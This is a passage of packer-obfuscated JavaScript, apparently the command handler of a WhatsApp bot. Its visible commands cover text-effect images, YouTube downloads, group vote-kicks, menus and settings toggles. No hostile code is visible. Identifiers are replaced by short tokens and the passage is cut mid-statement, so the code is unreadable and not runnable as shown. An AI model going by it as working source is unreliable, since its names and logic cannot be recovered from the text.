D(A(5x)+(R+1z)+A(CN));D(1o[A(1Q)]),8C=N[\'2K\'](\'|\')[J],a6=N[A(1y)](\'|\')[U],2V(A(1Lq),[\'\'+8C,\'\'+a6])[A(2h)](XH=>3z(XH,2c,{\'1b\':L,\'1N\':A(4X)}))[A(4m)](XI=>1t[A(1D)](XI));T;H\'XJ\':if(!N)E D(A(5x)+(R+1z)+A(CN));D(1o[A(1Q)]),8C=N[A(1y)](\'|\')[J],a6=N[\'2K\'](\'|\')[U],2V(\'1I://2V.me/8W-XJ-fc-XK-av-1Lr.5R\',[\'\'+8C,\'\'+a6])[A(2h)](XM=>3z(XM,2c,{\'1b\':L,\'1N\':\'6W\'}))[\'1P\'](XN=>1t[A(1D)](XN));T;H A(1Ls):if(!N)E D(A(5x)+(R+1z)+A(9r));D(1o[A(1Q)]),2V(A(1Lt),[\'\'+N])[A(2h)](XO=>3z(XO,2c,{\'1b\':L,\'1N\':A(4X)}))[A(4m)](XP=>1t[A(1D)](XP));T;H A(1Lu):if(!N)E D(A(5x)+(R+1z)+\'\\5C\');D(1o[A(1Q)]),2V(A(1Lv),[\'\'+N])[\'5f\'](XQ=>3z(XQ,2c,{\'1b\':L,\'1N\':A(4X)}))[A(4m)](XR=>1t[A(1D)](XR));T;H A(1Lw):if(!N)E D(A(5x)+(R+1z)+A(9r));D(1o[A(1Q)]),2V(A(1Lx),[\'\'+N])[\'5f\'](XS=>3z(XS,2c,{\'1b\':L,\'1N\':A(4X)}))[\'1P\'](XT=>1t[A(1D)](XT));T;H A(1Ly):if(!N)E D(A(5x)+(R+1z)+\'\\5C\');D(1o[A(1Q)]),2V(\'1I://2V.me/PA-2T-8n-1Lz.5R\',[\'\'+N])[A(2h)](XU=>3z(XU,2c,{\'1b\':L,\'1N\':\'6W\'}))[A(4m)](XV=>1t[A(1D)](XV));T;H A(1LA):if(!N)E D(A(5x)+(R+1z)+A(9r));D(1o[A(1Q)]),2V(A(1LB),[\'\'+N])[\'5f\'](XW=>3z(XW,2c,{\'1b\':L,\'1N\':A(4X)}))[\'1P\'](XX=>1t[A(1D)](XX));T;H A(1LC):if(!N)E D(A(5x)+(R+1z)+A(9r));D(1o[A(1Q)]),8C=N[A(1y)](\'|\')[J],a6=N[A(1y)](\'|\')[U],2V(\'1I://2V.me/av-Qo-1LD-hg-Rc-XK-fc-kv-1LE.5R\',[\'\'+8C,\'\'+a6])[\'5f\'](XY=>3z(XY,2c,{\'1b\':L,\'1N\':A(4X)}))[A(4m)](XZ=>1t[A(1D)](XZ));T;H A(1LF):if(!N)E D(A(5x)+(R+1z)+\'\\5C\');D(1o[\'5g\']),8C=N[A(1y)](\'|\')[J],a6=N[A(1y)](\'|\')[U],2V(A(1LG),[\'\'+8C,\'\'+a6])[A(2h)](Y0=>3z(Y0,2c,{\'1b\':L,\'1N\':A(4X)}))[A(4m)](Y1=>1t[A(1D)](Y1));T;H A(1LH):1Y{if(!N)E D(A(Y2));D(A(1LI)),aL=M dl(N),2u=M aL[A(4I)][A(aM)](Y3=>Y3[\'1e\']==A(aH));Z CO=2u[J][\'JD\'];1Y{1q ia=A(i2)+CO+\'/z0.3c\'}1P(1LJ){1q ia=\'1I://i.oE.1W/vi/\'+CO+\'/py.3c\'}lS=A(1LK);1T(Z g1 of 2u){lS+=A(1LL)+g1[A(7S)]+A(1LM)+g1[A(rV)]+A(1LN)+g1[A(CP)]+A(1LO)+g1[\'nZ\']+A(1LP)+g1[A(8y)][A(bD)]+A(1LQ)+g1[A(3R)]+\'\\I\\I\'}b=lS[A(8t)](),Y4=M 3W(2u[J][A(g2)]);Z Y5=[{\'1i\':R+A(rB)+2u[J][\'4w\']+\'\\B\',\'1j\':{\'1f\':A(lF)},\'1e\':A(3I)},{\'1i\':R+A(WA)+2u[J][A(3R)],\'1j\':{\'1f\':A(1LR)},\'1e\':A(3I)}];4c(F,b,\'bw\\B:\\B\'+4T[A(6o)]+A(8A)+2C,Y4,Y5,{\'1n\':1F})}1P(CQ){1t[A(1D)](CQ),D(\'\'+CQ)}T;H\'IS\':{if(!N)E D(\'f4\\6R\\fv\');D(1o[\'5g\']),aL=M dl(N);if(aL[A(4I)][A(1m)]==\'0\')E D(A(Cf));2J=M aL[A(4I)][\'8S\'](Y6=>Y6[A(rD)]==A(aH));1Y{1q 2u=2J[J],lT=M 5l[A(lJ)](2u[A(3R)]);1t[A(1D)](lT)}1P{1q 2u=2J[U],lT=M 5l[\'pv\'](2u[A(3R)])}Z Y7=5l[\'yQ\'](lT[A(eo)],\'Nc\'),Y8=5l[A(rz)](lT[A(eo)],{\'lK\':\'18\'});1Y{1q ia=A(i2)+2u[A(rA)]+A(Cj)}1P(1LS){1q ia=A(i2)+2u[A(rA)]+\'/py.3c\'}Y9=M 3W(ia),ib={\'1n\':{\'fk\':1F,\'cR\':{\'4l\':5L+\'\\B\'+2m,\'bL\':A(CR),\'kV\':\'2\',\'2U\':Y9,\'kW\':2u[\'4w\']}}},1a=A(1LT)+2u[\'4l\']+A(1LU)+8H(2u[A(rV)])+\'\\1LV\\I⏳\\h3\\B:\\B\'+2u[\'nZ\']+A(1LW)+2u[A(8y)][A(bD)]+A(Cl)+8G(Y7[J][A(a1)])+A(Cm)+8G(Y8[A(a1)]),i3=M 3W(\'\'+ia);Z CS=[{\'1i\':R+A(rB)+2u[A(3R)]+\'\\B\',\'1j\':{\'1f\':A(lF)},\'1e\':\'9b\'},{\'1i\':R+\'pi\\B\'+2u[A(3R)],\'1j\':{\'1f\':A(WP)},\'1e\':\'9b\'}];4h===A(9j)?fP(F,A(1LX)+1a,\'©\\B\'+2C,fs[A(1C)](A(g3)),CS,ib):4c(F,A(1LY)+1a,\'©\\B\'+2C,i3,CS,{\'1n\':1F})}T;H A(1LZ):{if(!7g)E D(A(rm));Z Yb=M 5l[\'pv\'](N),rW=5l[A(Cq)](Yb[A(eo)],A(lu));1t[\'3P\'](rW);1Y{rX=rW[4D][\'k4\']}1P(1M0){rX=rW[J][\'k4\']}if(5U(rX)>1M1)E D(A(rY)+8G(rX)+\'\\zk\\ff\\8T\\jd\\pA\\B😤\');D(A(VO)),Bi(N)}T;H A(1M2):{if(!7g)E D(A(rm));Z Yc=M 5l[A(lJ)](N),CT=5l[A(rz)](Yc[\'w3\'],{\'lK\':\'18\'});if(5U(CT[A(a1)])>Yd)E D(A(rY)+8G(CT[A(a1)])+\'\\zk\\ff\\8T\\jd\\pA\\B😤\');D(\'*p8...*\'),Bg(N)}T;H\'L8\':1Y{if(!N)E D(A(1M3));if(N[A(1M)](A(Ye)))E D(A(Yf));if(4Z(1p,2Y,1k,3B,1w))E D(1o[A(Yg)]);if(!7g(N))E D(\'5A\\5c\');D(A(Yh));Z 1M4=Q[J][A(kE)](/(?:1I?:\\/{2})?(?:w{3}\\.)?h2(?:be)?\\.(?:1W|be)(?:\\/fj\\?v=|\\/)([^\\s&]+)/);if(N[A(1M)](\'1I://h2.be/\'))1q bU=N[A(1B)](A(CU),\'\');Y{if(N[A(1M)](\'1I://bp.1W/fj?v=\'))1q bU=N[\'2K\'](\'=\')[U];Y{if(N[A(1M)](\'1I://bp.1W/wt/\'))1q bU=N[\'3h\'](A(Yi),\'\');Y E D(\'az\\5e\')}}Z CV=\'1I://bp.1W/fj?v=\'+bU,da=M dl(CV),CW=M 5l[\'pv\'](CV),rZ=5l[A(Cq)](CW[A(eo)],A(lu));if(5U(rZ[A(a1)])>1M5)E D(A(rY)+8G(rZ[\'k4\'])+A(Yj));1a=A(1M6)+CW[A(1M7)][\'4l\']+A(1M8)+8G(rZ[J][A(a1)])+\'\\I🆔\\pl\\B:\\B\'+bU+A(1M9)+da[A(4I)][J][A(Ck)]+\'\\I📊\\Nl\\B:\\B\'+8H(da[A(4I)][J][A(rV)])+A(Yk)+da[\'cv\'][J][A(CP)]+A(Yl)+da[A(4I)][J][A(8y)][\'7J\']+\'\\I??\\oj\\B:\\B\'+da[A(4I)][J][\'NS\'][\'4w\']+\'\\I🔗\\x1\\B:\\B\'+da[A(4I)][J][A(3R)]+A(1Ma)+da[A(4I)][J][A(rt)],3z(da[\'cv\'][J][A(g2)],2c,{\'1b\':L,\'1N\':1a}),Bi(N),5a(1p,1w)}1P(CX){1t[\'3P\'](CX),D(\'\'+CX)}T;H\'NJ\':1Y{if(N[\'3y\'](A(Ye)))E D(A(Yf));if(4Z(1p,2Y,1k,3B,1w))E D(1o[A(Yg)]);if(!7g)E D(A(rm));D(A(Yh));if(N[A(1M)](A(CU)))1q bU=N[A(1B)](A(CU),\'\');Y{if(N[\'3y\'](\'1I://bp.1W/fj?v=\'))1q bU=N[A(1y)](\'=\')[U];Y{if(N[A(1M)](A(Yi)))1q bU=N[A(1B)](\'1I://bp.1W/wt/\',\'\');Y E D(A(1Mb))}}Z CY=A(1Mc)+bU,bV=M dl(CY),Ym=M 5l[A(lJ)](CY),s0=5l[\'MH\'](Ym[A(eo)],{\'lK\':\'18\'});if(5U(s0[A(a1)])>Yd)E D(A(rY)+8G(s0[A(a1)])+A(Yj));1a=A(1Md)+bV[\'cv\'][J][A(7S)]+\'\\I💾\\1Me\\B:\\1Mf\\I📄\\Jw\\B:\\B\'+8G(s0[A(a1)])+A(1Mg)+bU+\'\\I⏲️\\Ru\\B:\\B\'+bV[A(4I)][J][A(Ck)]+A(1Mh)+8H(bV[\'cv\'][J][A(rV)])+A(Yk)+bV[\'cv\'][J][A(CP)]+A(Yl)+bV[A(4I)][J][A(8y)][A(bD)]+\'\\I📹\\oj\\B:\\B\'+bV[A(4I)][J][A(8y)][A(3R)]+A(1Mi)+bV[A(4I)][J][A(3R)]+\'\\I📝\\MN\\B:\\B\'+bV[A(4I)][J][A(rt)],3z(bV[A(4I)][J][\'8j\'],2c,{\'1b\':L,\'1N\':1a}),Bg(N),5a(1p,1w)}1P(Yn){D(\'\'+Yn)}T;H\'IZ\':if(!N)E D(A(5x)+(R+1z)+A(9r));D(1o[A(1Q)]),2V(A(1Mj),[\'\'+N])[\'5f\'](Yo=>3z(Yo,2c,{\'1b\':L,\'1N\':\'6W\'}))[A(4m)](Yp=>1t[A(1D)](Yp));T;H A(1Mk):if(!N)E D(A(5x)+(R+1z)+A(9r));D(1o[A(1Q)]),2V(A(1Ml),[\'\'+N])[A(2h)](Yq=>3z(Yq,2c,{\'1b\':L,\'1N\':A(4X)}))[A(4m)](Yr=>1t[A(1D)](Yr));T;H\'1Mm\':if(!N)E D(A(5x)+(R+1z)+A(9r));D(1o[A(1Q)]),2V(\'1I://2V.me/jg-Oy-2T-8n-1Mn-K8-o6-1Mo.5R\',[\'\'+N])[\'5f\'](Ys=>3z(Ys,2c,{\'1b\':L,\'1N\':\'6W\'}))[\'1P\'](Yt=>1t[\'3P\'](Yt));T;H\'1Mp\':if(!N)E D(A(5x)+(R+1z)+A(9r));D(1o[\'5g\']),2V(\'1I://2V.me/T-1Mq-2T-8n-1Mr.5R\',[\'\'+N])[A(2h)](Yu=>3z(Yu,2c,{\'1b\':L,\'1N\':A(4X)}))[A(4m)](Yv=>1t[A(1D)](Yv));T;H A(1Ms):if(!N)E D(A(5x)+(R+1z)+A(9r));D(1o[\'5g\']),2V(A(1Mt),[\'\'+N])[\'5f\'](Yw=>3z(Yw,2c,{\'1b\':L,\'1N\':A(4X)}))[A(4m)](Yx=>1t[A(1D)](Yx));T;H A(1Mu):if(!N)E D(\'9G\\B\'+(R+1z)+A(9r));D(1o[A(1Q)]),2V(A(1Mv),[\'\'+N])[A(2h)](Yy=>3z(Yy,2c,{\'1b\':L,\'1N\':A(4X)}))[A(4m)](Yz=>1t[A(1D)](Yz));T;H\'1Mw\':if(!N)E D(A(5x)+(R+1z)+A(9r));D(1o[A(1Q)]),2V(A(1Mx),[\'\'+N])[A(2h)](YA=>3z(YA,2c,{\'1b\':L,\'1N\':\'6W\'}))[A(4m)](YB=>1t[A(1D)](YB));T;H A(YC):1a=\'\\I*]────「\\1My」────[*\\I\\Pk\\B\'+2m+A(1Mz)+8J(1p,1w)[A(d2)]()+A(1MA)+R+\'jX\\pP\\6v\\7I\\B:\\B\'+R+A(1MB)+R+A(1MC)+R+\'p4\\eX\',D(1a);T;H A(1MD):H A(1ME):H\'1MF\':if(!1A)E YD(A(7b));if(n3(F,7i))E D(\'Ot\\5d\\fq\\xk\\Qr\\1MG\');if(6Z[A(1m)]==U){if(6Z[J]===bC)E D(A(1MH));if(6Z[J]===2a)E D(A(1MI));1q CZ=7h(lU);5F(\'@\'+2a[A(1y)](\'@\')[J]+A(Xj)+6Z[J][A(1y)](\'@\')[J]+A(1MJ)+R+\'YE\\4s\\1MK\\1ML\\B🚫\\I\\je\\B:\\7G\\B\'+CZ[A(d2)](),[2a,6Z[J]],![]),7i[A(4b)]({\'id\':F,\'2L\':3T,\'1MM\':CZ,\'YF\':2a,\'YG\':6Z[J],\'1MN\':[A(1MO),A(1MP),A(1MQ),A(1MR),A(1MS),\'6️⃣\',\'7️⃣\',A(1MT),A(1MU)]}),9z(1p,1w)}Y D(A(g4)+R+A(1MV));T;H\'YE\':H A(1MW):if(!1A)E YD(A(7b));if(9y(1p,1k,5Z,1w))E D(A(bW));if(!n3(F,7i))E D(A(1MX));1q g5=H9(F,7i);if(7i[g5][\'YF\'][\'3y\'](2a))7i[A(4A)](g5,U),D(A(s1));Y{if(7i[g5][\'YG\'][\'3y\'](2a))7i[\'dP\'](g5,U),D(A(s1));Y{if(2W)7i[A(4A)](g5,U),D(A(s1));Y 1k?(7i[A(4A)](g5,U),D(A(s1))):D(A(1MY))}}T;H A(1MZ):6b=mZ[\'6T\'](R,2m);Z s2=[{\'1i\':A(D0),\'1j\':{\'1f\':\'ɪɴғᴏ\\Bʙᴏᴛᴢ\'},\'1e\':A(3I)},{\'1i\':R+A(1N0),\'1j\':{\'1f\':A(lV)},\'1e\':A(3I)}];if(4h===A(s3))aJ(A(bX)),Aw(mZ[A(YH)](R,2m));Y{if(4h===A(bM))qz(mZ[A(YH)](R,2m));Y{if(4h===A(ec))aJ(\'*aX...*\'),4c(F,6b,\'©\\B\'+2C,fs[A(1C)](A(YI)),s2,{\'1n\':1F});Y{if(4h===A(cT))aJ(\'*aX...*\'),l6(fs[A(1C)](A(1N1)),6b+(A(YJ)+4T[A(6o)]+A(8A)+2C));Y{if(4h===A(1N2))aJ(A(bX)),fP(F,6b,A(a2)+4T[A(6o)]+\'\\I©\\B\'+2C,fs[\'2B\'](\'./4E/oB.3c\'),s2,6q);Y 4h===A(g2)&&(aJ(A(bX)),qu(F,6b,A(a2)+4T[A(6o)]+\'\\I©\\B\'+2C,fs[\'2B\'](A(YI)),s2,{\'2U\':3D,\'dN\':Ty}))}}}}T;H A(5r):H A(1N3):H A(1N4):1Y{1N5=\'\'+2a,6b=n0[A(5r)](u9,B8,9A,aU,mY,hP,zI,zJ,3F,hw,fs,2Y,gx,3B,8J,1p,cc,6t,aj,1w,5N,8L,2q,al,3Y,8N,dr,hA,kI,fL,fI,fJ,fK,cd,2m,5L,R,aV,mW,u8,7f);Z s4=[{\'1i\':A(D0),\'1j\':{\'1f\':A(1N6)},\'1e\':A(3I)},{\'1i\':A(lW),\'1j\':{\'1f\':\'sᴇᴡᴀ\\Bʙᴏᴛᴢ\'},\'1e\':A(3I)}];6q={\'1n\':{\'fk\':1F,\'cR\':{\'4l\':5L+A(qi),\'kS\':\'QW\',\'2U\':3D,\'qt\':\'1I://h2.be/1N7\'}}},ib={\'1b\':2d,\'1n\':{\'fk\':1F,\'cR\':{\'4l\':5L+\'\\B\'+2m,\'bL\':\'*OH\\OI\\dF\\OJ\\OK\',\'kV\':\'2\',\'2U\':3D,\'kW\':A(1N8)}}};if(4h===A(s3))aJ(A(bX)),Aw(6b);Y{if(4h===A(bM))qz(6b);Y{if(4h===A(9j))aJ(\'*aX...*\'),fP(F,6b,A(a2)+4T[A(6o)]+\'\\I©\\B\'+2C,fs[\'2B\'](A(g3)),s4,ib);Y{if(4h===A(ec))aJ(\'*aX...*\'),4c(F,6b,A(a2)+4T[A(6o)]+A(8A)+2C,fs[A(1C)](A(aT)),s4,{\'1n\':1F});Y{if(4h===A(cT))aJ(A(bX)),l6(fs[\'2B\'](\'./4E/9K.aA\'),6b+(A(YJ)+4T[\'hk\']+A(8A)+2C));Y 4h===\'8j\'&&(aJ(A(bX)),qu(F,6b,\'bw\\B:\\B\'+4T[\'hk\']+A(8A)+2C,fs[\'2B\'](A(aT)),s4,6q))}}}}}1P(YK){aI(YK),qz(6b)}T;H A(1N9):if(!1k)E;if(Q[J]===A(s3)||Q[J]===A(D1))4h=A(s3),M 1O(F,\'2G\\4k\\nQ\\dw\\2z\\B\'+N,A(3v),[{\'1i\':R+A(ic),\'1j\':{\'1f\':A(9W)},\'1e\':U},{\'1i\':R+\'aS\',\'1j\':{\'1f\':A(8B)},\'1e\':U}]);Y{if(Q[J]===A(g2)||Q[J]===\'9q\')4h=A(g2),M 1O(F,A(g6)+N,A(3v),[{\'1i\':R+A(ic),\'1j\':{\'1f\':\'ᴘʀᴏғɪʟᴇ\'},\'1e\':U},{\'1i\':R+A(5r),\'1j\':{\'1f\':A(8B)},\'1e\':U}]);Y{if(Q[J]===A(ec))4h=A(ec),M 1O(F,A(g6)+N,A(3v),[{\'1i\':R+A(ic),\'1j\':{\'1f\':A(9W)},\'1e\':U},{\'1i\':R+A(5r),\'1j\':{\'1f\':A(8B)},\'1e\':U}]);Y{if(Q[J]===A(bM))4h=A(bM),M 1O(F,A(g6)+N,A(3v),[{\'1i\':R+\'he\',\'1j\':{\'1f\':A(9W)},\'1e\':U},{\'1i\':R+\'aS\',\'1j\':{\'1f\':\'ᴍᴇɴᴜ\'},\'1e\':U}]);Y{if(Q[J]===\'J9\')ao=A(qw),4h=A(9j),M 1O(F,A(g6)+N,A(3v),[{\'1i\':R+\'he\',\'1j\':{\'1f\':A(9W)},\'1e\':U},{\'1i\':R+A(5r),\'1j\':{\'1f\':\'ᴍᴇɴᴜ\'},\'1e\':U}]);Y{if(Q[J]===A(YL))ao=A(YL),4h=\'pU\',M 1O(F,A(g6)+N,A(3v),[{\'1i\':R+\'he\',\'1j\':{\'1f\':A(9W)},\'1e\':U},{\'1i\':R+A(5r),\'1j\':{\'1f\':A(8B)},\'1e\':U}]);Y{if(Q[J]===A(At))ao=A(At),4h=A(9j),M 1O(F,A(g6)+N,A(3v),[{\'1i\':R+\'he\',\'1j\':{\'1f\':A(9W)},\'1e\':U},{\'1i\':R+A(5r),\'1j\':{\'1f\':A(8B)},\'1e\':U}]);Y{if(Q[J]===A(kZ))ao=A(kZ),4h=A(9j),M 1O(F,\'2G\\4k\\nQ\\dw\\2z\\B\'+N,A(3v),[{\'1i\':R+\'he\',\'1j\':{\'1f\':A(9W)},\'1e\':U},{\'1i\':R+A(5r),\'1j\':{\'1f\':\'ᴍᴇɴᴜ\'},\'1e\':U}]);Y{if(Q[J]===A(Tx))ao=\'uW\',4h=A(9j),M 1O(F,A(g6)+N,\'7r\\7P\\5e\\5S\',[{\'1i\':R+A(ic),\'1j\':{\'1f\':A(9W)},\'1e\':U},{\'1i\':R+A(5r),\'1j\':{\'1f\':A(8B)},\'1e\':U}]);Y{if(Q[J]===A(cT))4h=A(cT),M 1O(F,\'2G\\4k\\nQ\\dw\\2z\\B\'+N,\'7r\\7P\\5e\\5S\',[{\'1i\':R+A(ic),\'1j\':{\'1f\':A(9W)},\'1e\':U},{\'1i\':R+A(5r),\'1j\':{\'1f\':A(8B)},\'1e\':U}]);Y!N?1O(F,A(1Na),\'7r\\7P\\5e\\5S\',[{\'1i\':R+A(1Nb),\'1j\':{\'1f\':A(1Nc)},\'1e\':U},{\'1i\':R+A(1Nd),\'1j\':{\'1f\':A(D2)},\'1e\':U},{\'1i\':R+A(1Ne),\'1j\':{\'1f\':A(YM)},\'1e\':U}]):D(A(1Nf))}}}}}}}}}T;H A(1Ng):if(!1k)E 1S();if(Q[J]===\'wl\'||Q[J]===A(D1)){if(3t===A(Ad))E D(A(6c));3t=A(Ad),M K[A(1l)](F,A(er)+N,1r,{\'1b\':zX})}Y{if(Q[J]===A(qs)){if(3t===A(qs))E D(A(6c));3t=A(qs),M K[\'1K\'](F,A(er)+N,1r,{\'1b\':zY})}Y{if(Q[J]===A(Ae)){if(3t===A(Ae))E D(A(6c));3t=\'yZ\',M K[A(1l)](F,A(er)+N,1r,{\'1b\':A1})}Y{if(Q[J]===\'kq\'){if(3t===\'kq\')E D(\'4r\\3m\');3t=\'kq\',M K[\'1K\'](F,A(er)+N,1r,{\'1b\':A2})}Y{if(Q[J]===A(Af)){if(3t===\'wA\')E D(A(6c));3t=A(Af),M K[A(1l)](F,\'2G\\4k\\fy\\2z\\B\'+N,1r,{\'1b\':A3})}Y{if(Q[J]===\'oA\'){if(3t===A(SV))E D(A(6c));3t=\'oA\',M K[A(1l)](F,A(er)+N,1r,{\'1b\':A4})}Y{if(Q[J]===A(D3)){if(3t===A(D3))E D(\'4r\\3m\');3t=A(D3),M K[A(1l)](F,\'2G\\4k\\fy\\2z\\B\'+N,1r,{\'1b\':A5})}Y{if(Q[J]===\'v3\'){if(3t===A(Ag))E D(\'4r\\3m\');3t=A(Ag),M K[A(1l)](F,\'2G\\4k\\fy\\2z\\B\'+N,1r,{\'1b\':A6})}Y{if(Q[J]===A(Ah)){if(3t===A(Ah))E D(A(6c));3t=\'yT\',M K[A(1l)](F,A(er)+N,1r,{\'1b\':A7})}Y{if(Q[J]===\'yV\'){if(3t===A(Ai))E D(A(6c));3t=A(Ai),M K[A(1l)](F,A(er)+N,1r,{\'1b\':A8})}Y{if(Q[J]===\'pK\'){if(3t===A(YN))E D(A(6c));3t=A(YN),M K[\'1K\'](F,\'2G\\4k\\fy\\2z\\B\'+N,1r,{\'1b\':A9})}Y{if(Q[J]===A(qQ)){if(3t===\'jv\')E D(A(6c));3t=A(qQ),M K[\'1K\'](F,A(er)+N,1r,{\'1b\':L})}Y!N?1O(F,A(1Nh),A(3v),[{\'1i\':R+\'nF\\1Ni\',\'1j\':{\'1f\':A(1Nj)},\'1e\':U},{\'1i\':R+A(1Nk),\'1j\':{\'1f\':\'ғᴋᴏɴᴛᴀᴋ\'},\'1e\':U},{\'1i\':R+A(1Nl),\'1j\':{\'1f\':A(1Nm)},\'1e\':U}]):(1a=\'1Nn\\2F\\2o\\R4\\5e\\PN\\7P\\5e\\5S\\fy\\pD:\\cm.wl\\jR.Ok\\jS.yZ\\jT.kq\\jU.wA\\oK.oA\\wW.yP\\wX.v3\\wY.yT\\pE.yV\\1No.pK\\1Np.jv\',D(1a))}}}}}}}}}}}T;H A(1Nq):if(!1k)E 1S();if(Q[J]===\'Nm\'||Q[J]===A(1Nr)){if(7m===A(Aj))E D(\'4r\\3m\');7m=A(Aj),D(A(D4)+N)}Y{if(Q[J]===A(bM)){if(7m===A(bM))E D(A(6c));7m=\'xE\',D(\'2G\\4k\\xU\\cp\\2z\\B\'+N)}Y{if(Q[J]===A(Al)){if(7m===A(Al))E D(A(6c));7m=\'O9\',D(A(D4)+N)}Y{if(Q[J]===A(1Ns)||Q[J]===A(aH)){if(7m===\'LI\')E D(\'4r\\3m\');7m=A(aH),D(A(1Nt)+N)}Y{if(Q[J]===A(fO)){if(7m===A(fO))E D(\'4r\\3m\');7m=\'1b\',D(A(D4)+N)}Y!N?1O(F,A(1Nu),A(3v),[{\'1i\':R+A(1Nv),\'1j\':{\'1f\':\'ᴡᴇʙ\'},\'1e\':U},{\'1i\':R+A(YO),\'1j\':{\'1f\':\'ᴛʀᴏʟɪ\'},\'1e\':U},{\'1i\':R+A(YP),\'1j\':{\'1f\':A(YQ)},\'1e\':U}]):D(A(1Nw))}}}}T;H A(1Nx):if(!1k)E 1S();if(Q[J]===A(bM)||Q[J]===A(D1)){if(am===A(bM))E D(A(6c));am=A(bM),M K[\'1K\'](F,A(1Ny),1r,{\'1b\':2d})}Y{if(Q[J]===A(ec)){if(am===A(ec))E D(A(6c));am=A(ec),M K[A(1l)](F,A(1Nz),1r,{\'1b\':2d})}Y{if(Q[J]===A(9j)||Q[J]===A(kZ)||Q[J]===\'Qk\'||Q[J]===\'1NA\'){if(am===A(9j))E D(A(6c));am=A(9j),M K[A(1l)](F,A(1NB),1r,{\'1b\':2d})}Y!N&&1O(F,A(1NC),A(3v),[{\'1i\':R+A(1ND),\'1j\':{\'1f\':A(1NE)},\'1e\':U},{\'1i\':R+A(1NF),\'1j\':{\'1f\':A(D2)},\'1e\':U},{\'1i\':R+\'pt\\w0\',\'1j\':{\'1f\':A(YM)},\'1e\':U}])}}T;H\'IQ\':H A(1NG):H A(1NH):H\'1NI\':if(!7j(A(s5),F,2n)&&1A)E D(A(YR));if(4Z(1p,2Y,1k,3B,1w))E 3o(A(7x)+R+A(7u));D(1o[A(1Q)]),a7=M 7Z(A(1NJ)+1z),9S(F,a7[A(3R)],A(ie)),5a(1p,1w);T;H\'1NK\':H A(YS):H A(1NL):H A(1NM):H\'1NN\':H A(1NO):H A(1NP):H\'1NQ\':H A(1NR):H A(1NS):H\'1NT\':H A(1NU):H A(1NV):H A(1NW):H A(1NX):H\'bj\':if(!7j(A(s5),F,2n)&&1A)E D(A(YR));if(4Z(1p,2Y,1k,3B,1w))E 3o(A(7x)+R+A(7u));D(1o[\'5g\']),a7=M 7Z(A(YT)+1z),9S(F,a7[A(3R)],A(ie)),5a(1p,1w);T;H A(1NY):H A(1NZ):H A(1O0):H A(1O1):H A(1O2):H A(1O3):H A(YU):H A(1O4):H A(YS):H A(1O5):H A(1O6):H A(1O7):H A(1O8):H A(1O9):H A(1Oa):H A(1Ob):H A(1Oc):H A(1Od):H A(1Oe):H A(1Of):H A(1Og):H A(1Oh):H A(1Oi):H\'1Oj\':H A(1Ok):H A(1Ol):D(1o[A(1Q)]);if(4Z(1p,2Y,1k,3B,1w))E 3o(A(7x)+R+A(7u));a7=M 7Z(A(1Om)+1z),9S(F,a7[A(3R)],A(ie)),5a(1p,1w);T;H A(1On):D(1o[\'5g\']);if(4Z(1p,2Y,1k,3B,1w))E 3o(A(7x)+R+A(7u));a7=M 7Z(A(1Oo)),9S(F,a7[\'4w\'],A(ie)),5a(1p,1w);T;H A(1Op):H A(YU):H A(1Oq):H A(1Or):D(1o[A(1Q)]);if(4Z(1p,2Y,1k,3B,1w))E 3o(A(7x)+R+\'8p\\4s\\fz\\6v\');a7=M 7Z(A(YT)+1z),9S(F,a7[A(3R)],\'ps!\'),5a(1p,1w);T;H A(1Os):1Y{if(!N)E D(A(1Ot));9x[A(1Ou)](N)[\'5f\'](YV=>{D(YV)})}1P(YW){1t[A(1D)](YW),D(A(lX))}T;H A(1Ov):1Y{if(!N)E D(A(1Ow));9x[\'1Ox\'](N)[A(2h)](YX=>{D(YX)})}1P(YY){1t[\'3P\'](YY),D(\'ht\\4j,\\ax\\3H\\7L\\B😋\')}T;H A(1Oy):1Y{if(!N)E D(A(1Oz));if(Q[A(1m)]<4D)E D(\'5A\\9d\\yo\\8h\\vo\\vp\');if(Q[A(1m)]>4D)E D(A(1OA));9x[A(1OB)](Q[J],Q[U])[A(2h)](YZ=>{D(YZ)})}1P(Z0){1t[\'3P\'](Z0),D(A(lX))}T;H A(1OC):1Y{if(!N)E D(A(1OD));9x[A(1OE)](N)[A(2h)](Z1=>{D(Z1)})}1P(Z2){1t[A(1D)](Z2),D(A(lX))}T;H A(1OF):1Y{if(!N)E D(A(1OG));if(Q[A(1m)]<4D)E D(A(1OH));if(Q[A(1m)]>4D)E D(\'5A\\p5\\8h\\9J\\xW\\B\\p6-1-xX\');9x[A(1OI)](Q[J],Q[U])[A(2h)](Z3=>{D(Z3)})}1P(Z4){1t[A(1D)](Z4),D(\'ht\\4j,\\ax\\3H\\7L\\B😋\')}T;H A(Z5):1Y{if(!N)E D(\'\\p5\\B?\\8h\\9J\\Rz\\zx-4-RA\\RB\\6P-2-RC\');if(Q[A(1m)]<c8)E D(A(Z6));if(Q[\'2P\']>c8)E D(A(Z6));9x[A(Z5)](Q[J],Q[U],Q[4D],Q[eO])[A(2h)](Z7=>{D(Z7)})}1P(Z8){1t[A(1D)](Z8),D(A(lX))}T;H A(1OJ):1Y{if(!N)E D(\'OZ\\6R\\1H\\8h\\zx-1-pB\');9x[\'1OK\'](N)[A(2h)](Z9=>{D(Z9)})}1P(Za){1t[A(1D)](Za),D(\'ht\\4j,\\ax\\3H\\7L\\B😋\')}T;H A(Zb):1Y{if(!N)E D(A(1OL));if(Q[A(1m)]<4D)E D(A(Zc));if(Q[\'2P\']>4D)E D(A(Zc));9x[A(Zb)](Q[J],Q[U])[A(2h)](Zd=>{D(Zd)})}1P(Ze){1t[\'3P\'](Ze),D(\'ht\\4j,\\ax\\3H\\7L\\B😋\')}T;H\'KD\':1Y{if(!N)E D(A(1OM));9x[A(1ON)](N)[\'5f\'](Zf=>{D(Zf)})}1P(Zg){1t[A(1D)](Zg),D(A(lX))}T;H A(Zh):1Y{if(!N)E D(A(1OO));9x[A(Zh)](N)[A(2h)](Zi=>{D(Zi)})}1P(Zj){1t[\'3P\'](Zj),D(\'ht\\4j,\\ax\\3H\\7L\\B😋\')}T;H A(1OP):H A(1OQ):W Zk=lY[\'1OR\'](1OS),Zl=Zk[A(1OT)](1OU);if(!N[A(1M)](\'|\'))E D(\'9G\\5C|\\5C\');W Zm=N[A(Zn)](J,N[A(D5)](\'|\')-J),Zo=N[A(Zn)](N[A(1OV)](\'|\')+U);D(Zm+Zl+Zo);T;H A(1OW):if(2X)E;if(!1k)E 1S();if(Q[A(1m)]<U)E 3o(A(D6));1T(Z 